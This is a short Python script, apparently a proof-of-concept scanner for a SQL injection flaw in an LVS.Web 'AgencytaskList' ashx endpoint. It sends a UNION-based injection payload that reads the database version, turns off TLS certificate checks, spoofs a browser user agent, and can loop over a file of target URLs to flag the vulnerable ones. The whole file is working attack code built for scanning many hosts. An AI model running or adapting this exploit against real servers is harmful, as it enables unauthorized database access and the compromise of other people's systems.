import requests
import urllib3
import re,string,random
from urllib.parse import urljoin
import argparse
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    taeget = urljoin(url, "/ajax/LVS.Web.AgencytaskList,LVS.Web.ashx?_method=GetColumnIndex&_session=r")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
        "Content-Type":"text/plain; charset=UTF-8"
    }
    try:
        data="src=AgencytaskList\r\ngridid=1' UNION ALL SELECT @@VERSION--"
        response = requests.post(taeget, verify=False, data=data,headers=headers, timeout=10)
        if response.status_code ==200 and 'Microsoft' in response.text and 'Server' in response.text:
            print(f"\033[31mDiscovered；{url}: LVS_LVS.Web_SQLInject!\033[0m")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")
